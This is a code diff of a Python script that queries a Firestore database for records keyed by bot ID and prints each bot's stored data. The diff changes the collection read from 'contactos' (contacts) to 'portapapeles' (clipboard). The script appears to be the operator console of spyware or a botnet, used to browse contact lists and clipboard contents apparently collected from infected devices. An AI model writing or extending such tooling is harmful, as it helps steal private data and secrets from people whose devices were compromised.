@@ -13,7 +13,7 @@ now = datetime.now()
 dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
 
 lista = []
-docs = firestore_db.collection(u'contactos').where(u'Bot_ID', u'!=', "").stream()
+docs = firestore_db.collection(u'portapapeles').where(u'Bot_ID', u'!=', "").stream()
 cantidad = 0
 for doc in docs:
     if(not(doc.get("Bot_ID") in lista)):
@@ -21,19 +21,19 @@ for doc in docs:
 
 print(lista)
 
-seleccionBot = input("Select a Bot ID or press enter to get the name + number for all available bots contact list: ")
+seleccionBot = input("Select a Bot ID or press enter to get the information for all available bots: ")
 if(seleccionBot == ""):
     for i in lista:
-        doc_ref = firestore_db.collection(u'contactos').document(i)
+        doc_ref = firestore_db.collection(u'portapapeles').document(i)
         doc = doc_ref.get()
         if doc.exists:
-            print(f'Contacts for {i}: {doc.to_dict()}')
+            print(f'Document data for bot {i}: {doc.to_dict()}')
         else:
             print(u'The selected Bot ID is wrong or it does not exist on the Database')
 else:
-    doc_ref = firestore_db.collection(u'contactos').document(seleccionBot)
+    doc_ref = firestore_db.collection(u'portapapeles').document(seleccionBot)
     doc = doc_ref.get()
     if doc.exists:
-        print(f'Contacts for {seleccionBot}: {doc.to_dict()}')
+        print(f'Document data: {doc.to_dict()}')
     else:
         print(u'The selected Bot ID is wrong or it does not exist on the Database')
